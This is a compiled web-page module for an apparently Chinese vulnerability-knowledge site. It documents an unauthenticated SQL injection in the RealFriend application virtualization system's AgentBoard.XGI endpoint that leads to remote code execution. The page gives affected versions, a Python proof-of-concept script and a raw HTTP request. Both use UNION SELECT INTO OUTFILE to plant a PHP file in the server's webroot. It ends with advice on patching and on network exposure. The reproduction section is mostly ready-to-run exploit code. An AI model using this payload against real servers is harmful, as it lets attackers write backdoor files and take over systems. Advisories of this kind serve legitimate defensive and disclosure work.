import{_ as a}from"./plugin-vue_export-helper-c27b6911.js";import{r,o as s,c as d,a as e,b as n,d as l,e as t}from"./app-58e4a7d6.js";const o={},c=t(`<h2 id="漏洞描述" tabindex="-1"><a class="header-anchor" href="#漏洞描述" aria-hidden="true">#</a> 漏洞描述</h2><p>瑞友天翼应用虚拟化系统是基于服务器计算架构的应用虚拟化平台，它将用户各种应用软件集中部署到瑞友天翼服务集群，客户端通过 WEB 即可访问经服务器上授权的应用软件，实现集中应用、远程接入、协同办公等。未经身份认证的远程攻击者可以利用系统中存在的 SQL 注入漏洞，写入后门文件，从而执行远程代码。</p><h2 id="漏洞影响" tabindex="-1"><a class="header-anchor" href="#漏洞影响" aria-hidden="true">#</a> 漏洞影响</h2><div class="language-text line-numbers-mode" data-ext="text"><pre class="language-text"><code>5.x &lt;= 瑞友天翼应用虚拟化系统 &lt;= 7.0.3.1
</code></pre><div class="line-numbers" aria-hidden="true"><div class="line-number"></div></div></div><h2 id="漏洞复现" tabindex="-1"><a class="header-anchor" href="#漏洞复现" aria-hidden="true">#</a> 漏洞复现</h2><p>poc</p><div class="language-text line-numbers-mode" data-ext="text"><pre class="language-text"><code>import requests
import sys

url = sys.argv[1]
payload=&quot;/AgentBoard.XGI?user=-1%27+union+select+1%2C%27%3C%3Fphp+phpinfo%28%29%3B%3F%3E%27+into+outfile+%22C%3A%5C%5CProgram%5C+Files%5C+%5C%28x86%5C%29%5C%5CRealFriend%5C%5CRap%5C+Server%5C%5CWebRoot%5C%5C1.php%22+--+-&amp;cmd=UserLogin&quot;
repose = requests.get(url=url+payload)
if repose.status_code ==200:
    a = url + &#39;1.php&#39;
    b = requests.get(url=a)
    if b.status_code == 200:
        print(&#39;[+] 漏洞存在，验证地址: {}1.php &#39;.format(url))
</code></pre><div class="line-numbers" aria-hidden="true"><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div></div></div><p>payload</p><div class="language-text line-numbers-mode" data-ext="text"><pre class="language-text"><code>GET /AgentBoard.XGI?user=-1%27+union+select+1%2C%27%3C%3Fphp+phpinfo%28%29%3B%3F%3E%27+into+outfile+%22C%3A%5C%5CProgram%5C+Files%5C+%5C%28x86%5C%29%5C%5CRealFriend%5C%5CRap%5C+Server%5C%5CWebRoot%5C%5C2.php%22+--+-&amp;cmd=UserLogin HTTP/1.1
Host: xx.xx.xx.xx
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:109.0) Gecko/20100101 Firefox/111.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8
Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2
Accept-Encoding: gzip, deflate
Connection: close
Cookie: CookieLanguageName=ZH-CN; CookieAuthType=0
Upgrade-Insecure-Requests: 1
</code></pre><div class="line-numbers" aria-hidden="true"><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div></div></div><h2 id="漏洞修复" tabindex="-1"><a class="header-anchor" href="#漏洞修复" aria-hidden="true">#</a> 漏洞修复</h2>`,10),u=e("li",null,"避免将该系统开放至公网。",-1),p={href:"http://soft.realor.cn:88/Gwt7.0.4.1.exe",target:"_blank",rel:"noopener noreferrer"};function v(m,h){const i=r("ExternalLinkIcon");return s(),d("div",null,[c,e("ol",null,[u,e("li",null,[n("官方已发布漏洞补丁及修复版本，请评估业务是否受影响后，建议您在升级前做好数据备份工作，避免出现意外，酌情升级至安全版本："),e("a",p,[n("http://soft.realor.cn:88/Gwt7.0.4.1.exe"),l(i)])])])])}const x=a(o,[["render",v],["__file","瑞友天翼应用虚拟化系统 AgentBoard.XGI 远程代码执行漏洞.html.vue"]]);export{x as default};
